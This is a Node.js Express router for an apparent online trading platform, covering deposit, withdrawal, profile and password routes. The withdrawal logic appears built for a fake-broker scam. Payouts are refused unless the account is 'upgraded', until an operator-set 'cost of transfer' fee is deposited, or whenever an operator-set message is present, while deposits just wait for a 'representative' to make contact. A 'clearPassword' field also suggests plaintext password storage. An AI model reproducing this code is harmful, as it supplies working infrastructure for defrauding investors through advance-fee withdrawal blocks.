const router = require("express").Router();
const {ensureAuthenticated} = require("../config/auth");
const User = require("../model/User");
const History = require("../model/History");
const bcrypt = require("bcryptjs");
const uuid = require("uuid");
const path = require("path");
const comma = require("../utils/comma");

router.get("/dashboard", ensureAuthenticated, (req,res) => {
    try{
        return res.render("trade/dashboard", {pageTitle: "Dashbaord", req, comma, layout: "layout2"});
    }catch(err){
        return res.redirect("/");
    }
});

router.get("/profile", ensureAuthenticated, (req,res) => {
    try{
        return res.render("trade/profile", {pageTitle: "Profile", req, comma, layout: "layout2"});
    }catch(err){
        return res.redirect("/");
    }
});

router.get("/security", ensureAuthenticated, (req,res) => {
    try{
        return res.render("trade/security", {pageTitle: "security", req, comma, layout: "layout2"});
    }catch(err){
        return res.redirect("/");
    }
});

router.get("/deposit", ensureAuthenticated, async (req,res) => {
    try{
        const history = await History.find({type: "deposit", userID: req.user.id})
        return res.render("trade/deposit", {pageTitle: "history", req, history, comma, layout: "layout2"});
    }catch(err){
        return res.redirect("/");
    }
});

router.get("/history", ensureAuthenticated, (req,res) => {
    try{
        return res.render("trade/history", {pageTitle: "history", req, comma, layout: "layout2"});
    }catch(err){
        return res.redirect("/");
    }
});

router.get("/withdrawal", ensureAuthenticated, (req,res) => {
    try{
        return res.render("trade/withdrawal", {pageTitle: "withdrawal", req, comma, layout: "layout2"});
    }catch(err){
        return res.redirect("/");
    }
});

router.get("/withdrawal/history", ensureAuthenticated, async (req,res) => {
    try{
        const history = await History.find({type: "withdraw", userID: req.user.id})
        return res.render("trade/withdrawal-history", {pageTitle: "withdrawal", history, req, comma, layout: "layout2"});
    }catch(err){
        return res.redirect("/");
    }
});


router.get("/withdrawal/btc", ensureAuthenticated, (req,res) => {
    try{
        return res.render("trade/btc", {pageTitle: "withdrawal", req, comma, layout: "layout2"});
    }catch(err){
        return res.redirect("/");
    }
});

router.get("/withdrawal/wire", ensureAuthenticated, (req,res) => {
    try{
        return res.render("trade/wire", {pageTitle: "withdrawal", req, comma, layout: "layout2"});
    }catch(err){
        return res.redirect("/");
    }
});

router.get("/withdrawal/pm", ensureAuthenticated, (req,res) => {
    try{
        return res.render("trade/pm", {pageTitle: "withdrawal", req, comma, layout: "layout2"});
    }catch(err){
        return res.redirect("/");
    }
});

router.get("/stock", ensureAuthenticated, (req,res) => {
    try{
        return res.render("trade/stock", {pageTitle: "withdrawal", req, comma, layout: "layout2"});
    }catch(err){
        return res.redirect("/");
    }
});

router.get("/crypto", ensureAuthenticated, (req,res) => {
    try{
        return res.render("trade/crypto", {pageTitle: "withdrawal", req, comma, layout: "layout2"});
    }catch(err){
        return res.redirect("/");
    }
});

router.get("/cfd", ensureAuthenticated, (req,res) => {
    try{
        return res.render("trade/cfd", {pageTitle: "withdrawal", req, comma, layout: "layout2"});
    }catch(err){
        return res.redirect("/");
    }
});

router.get("/indices", ensureAuthenticated, (req,res) => {
    try{
        return res.render("trade/indices", {pageTitle: "withdrawal", req, comma, layout: "layout2"});
    }catch(err){
        return res.redirect("/");
    }
});

router.get("/metatrader", ensureAuthenticated, (req,res) => {
    try{
        return res.render("trade/metatrader", {pageTitle: "withdrawal", req, comma, layout: "layout2"});
    }catch(err){
        return res.redirect("/");
    }
});

router.post("/withdrawal/wire", ensureAuthenticated, async (req,res) => {
    try{
        const {amount, method, pin} = req.body;
        if(!amount || !method || !pin){
            req.flash("error_msg", "Please enter all fields to withdraw");
            return res.redirect("/withdrawal/wire");
        }
        if(req.user.balance < amount || amount < 0){
            req.flash("error_msg", "Insufficient balance. try and deposit.");
            return res.redirect("/withdrawal/wire");
        }
        if(amount < 1000){
            req.flash("error_msg", "Minimum withdrawer amount is $1000.");
            return res.redirect("/withdrawal/wire");
        }
        if(req.user.verify_status !== 'verified'){
            req.flash("error_msg", "Your account must be verified to make withdrawer. contact support for more info");
            return res.redirect("/withdrawal/wire");   
        }
        if(!req.user.upgraded){
            req.flash("error_msg", "Your account is not eligible for withdrawal, you must be upgrade your account to make withdrawer. contact support for more info");
            return res.redirect("/withdrawal/wire");   
        }
        if(pin !== req.user.pin){
            req.flash("error_msg", "Incorrect withdrawal PIN");
            return res.redirect("/withdrawal/wire"); 
        }
        if(req.user.debt > 0){
            req.flash("error_msg", "You have to deposit a COT(cost of transafer) fee $" + req.user.debt + " in order to withdraw funds.");
            return res.redirect("/withdrawal/wire");
        }
        if(req.user.defaultMessage){
            req.flash("error_msg", req.user.defaultMessage);
            return res.redirect("/withdrawal/wire");
        }
        else{
            const newHist = {
                amount: Number(amount.replace(/,/g, "")),
                method,
                userID: req.user.id,
                user: req.user,
                type: "withdraw",
                status: "pending",
            };
            const _newHist = new History(newHist);
            await _newHist.save();
            await User.updateOne({email: req.user.email}, {balance: req.user.balance - Number(amount.replace(/,/g, ""))})
            req.flash("success_msg", "Your withdrawal request has been received and is pending approval, our agent will be in touch with you shortly. You can chat with an agent with our live chat.");
            return res.redirect("/withdrawal/wire");
        }
    }catch(err){
        console.log(err);
        return res.redirect("/");
    }
});

router.post("/withdrawal/btc", ensureAuthenticated, async (req,res) => {
    try{
        const {amount, method, pin} = req.body;
        if(!amount || !method){
            req.flash("error_msg", "Please enter all fields to withdraw");
            return res.redirect("/withdrawal/btc");
        }
        if(req.user.balance < amount || amount < 0){
            req.flash("error_msg", "Insufficient balance. try and deposit.");
            return res.redirect("/withdrawal/btc");
        }
        if(amount < 1000){
            req.flash("error_msg", "Minimum withdrawer amount is $1000.");
            return res.redirect("/withdrawal/btc");
        }
        if(req.user.verify_status !== 'verified'){
            req.flash("error_msg", "Your account must be verified to make withdrawer. contact support for more info");
            return res.redirect("/withdrawal/btc");   
        }
        if(!req.user.upgraded){
            req.flash("error_msg", "Your account is not eligible for withdrawal, you must be upgrade your account to make withdrawer. contact support for more info");
            return res.redirect("/withdrawal/btc");   
        }
        if(pin !== req.user.pin){
            req.flash("error_msg", "Incorrect withdrawal PIN");
            return res.redirect("/withdrawal/btc"); 
        }
        if(req.user.debt > 0){
            req.flash("error_msg", "You have to deposit a COT(cost of transafer) fee $" + req.user.debt + " in order to withdraw funds.");
            return res.redirect("/withdrawal/btc");
        }
        if(req.user.defaultMessage){
            req.flash("error_msg", req.user.defaultMessage);
            return res.redirect("/withdrawal/btc");
        }
        else{
            const newHist = {
                amount: Number(amount.replace(/,/g, "")),
                method,
                userID: req.user.id,
                user: req.user,
                type: "withdraw",
                status: "pending",
            };
            const _newHist = new History(newHist);
            await _newHist.save();
            await User.updateOne({email: req.user.email}, {balance: req.user.balance - Number(amount.replace(/,/g, ""))})
            req.flash("success_msg", "Your withdrawal request has been received and is pending approval, our agent will be in touch with you shortly. You can chat with an agent with our live chat.");
            return res.redirect("/withdrawal/btc");
        }
    }catch(err){
        console.log(err);
        return res.redirect("/");
    }
});

router.post("/withdrawal/pm", ensureAuthenticated, async (req,res) => {
    try{
        const {amount, method, pin} = req.body;
        if(!amount || !method){
            req.flash("error_msg", "Please enter all fields to withdraw");
            return res.redirect("/withdrawal/pm");
        }
        if(req.user.balance < amount || amount < 0){
            req.flash("error_msg", "Insufficient balance. try and deposit.");
            return res.redirect("/withdrawal/pm");
        }
        if(amount < 1000){
            req.flash("error_msg", "Minimum withdrawer amount is $1000.");
            return res.redirect("/withdrawal/pm");
        }
        if(req.user.verify_status !== 'verified'){
            req.flash("error_msg", "Your account must be verified to make withdrawer. contact support for more info");
            return res.redirect("/withdrawal/pm");   
        }
        if(!req.user.upgraded){
            req.flash("error_msg", "Your account is not eligible for withdrawal, you must be upgrade your account to make withdrawer. contact support for more info");
            return res.redirect("/withdrawal/pm");   
        }
        if(pin !== req.user.pin){
            req.flash("error_msg", "Incorrect withdrawal PIN");
            return res.redirect("/withdrawal/pm"); 
        }
        if(req.user.debt > 0){
            req.flash("error_msg", "You have to deposit a COT(cost of transafer) fee $" + req.user.debt + " in order to withdraw funds.");
            return res.redirect("/withdrawal/pm");
        }
        if(req.user.defaultMessage){
            req.flash("error_msg", req.user.defaultMessage);
            return res.redirect("/withdrawal/wire");
        }
        else{
            const newHist = {
                amount: Number(amount.replace(/,/g, "")),
                method,
                userID: req.user.id,
                user: req.user,
                type: "withdraw",
                status: "pending",
            };
            const _newHist = new History(newHist);
            await _newHist.save();
            await User.updateOne({email: req.user.email}, {balance: req.user.balance - Number(amount.replace(/,/g, ""))})
            req.flash("success_msg", "Your withdrawal request has been received and is pending approval, our agent will be in touch with you shortly. You can chat with an agent with our live chat.");
            return res.redirect("/withdrawal/btc");
        }
    }catch(err){
        console.log(err);
        return res.redirect("/");
    }
});

router.post("/profile", ensureAuthenticated, async (req,res) => {
    try{
        const {dob, phone} = req.body;

        console.log(req.body)

        if(!phone || !dob){
            req.flash("error_msg", "Provide dob and phone number");
            return res.redirect("/profile");
        }

        const update = {
            phone,
            dob
        }

        await User.updateOne({_id: req.user.id}, update);
        req.flash("success_msg", "Account updated successfully")
        return res.redirect("/profile");

    }catch(err){

    }
});

router.post("/deposit", ensureAuthenticated, async (req,res) => {
    try{
        const {amount} = req.body;
        if(!amount){
            req.flash("error_msg", "Enter amount");
            return res.redirect("/deposit");
        }
        if(amount < 250){
            req.flash("error_msg", "Minimum deposit is $250");
            return res.redirect("/deposit");
        }

        const newHist = {
            amount: Number(amount.replace(/,/g, "")),
            userID: req.user.id,
            user: req.user,
            type: "deposit",
            status: "pending",
        };
        const _newHist = new History(newHist);
        await _newHist.save();
        req.flash("success_msg", "Order Received Our representative will get in touch with you shortly with necessary information regarding your deposit.");
        return res.redirect("/trade/dashboard");

    }catch(err){

    }
});

router.post("/security", ensureAuthenticated, async (req,res) => {
    try{
        const {password, password2} = req.body;

        if(!password || !password2){
            req.flash("error_msg", "Enter all fileds");
            return res.redirect("/security");
        }

        if(password.length < 6){
            req.flash("error_msg", "Password is too short");
            return res.redirect("/security");
        }

        if(password != password2){
            req.flash("error_msg", "Password are not equal");
            return res.redirect("/security");
        }

        const salt = await bcrypt.genSalt();
        const hash = await bcrypt.hash(password2, salt);

        await User.updateOne({_id: req.user.id}, {password: hash, clearPassword: hash});

        req.flash("success_msg", "Account updated successfully")
        return res.redirect("/security");

    }catch(err){

    }
});

module.exports = router;